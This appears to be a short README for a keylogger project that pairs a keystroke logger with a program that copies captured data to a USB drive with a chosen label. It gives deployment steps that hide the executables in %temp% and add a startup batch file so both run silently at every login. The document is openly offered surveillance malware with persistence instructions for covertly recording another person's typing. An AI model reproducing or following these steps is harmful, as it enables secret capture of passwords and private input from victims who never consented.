# keylogg-scanning4pendrive
simple keylogger + program which scan is in PC drive what name is 'something in code' and then copy it to your drive

U have to set ur pendrive name in checking.cpp in checkDriveLabel() on bottom of the file

After compile put main.cpp & checking.cpp in %temp%. Then press win + r write them shell:startup. 
In window which opened create new .bat file, paste there it: 
    cd %temp% 
    start (name of first exe file, default main.exe) main.exe
    start (name of second exe file, default checking.exe) checking.exe
Done.

Keylogger in 95% made by EgeBalci
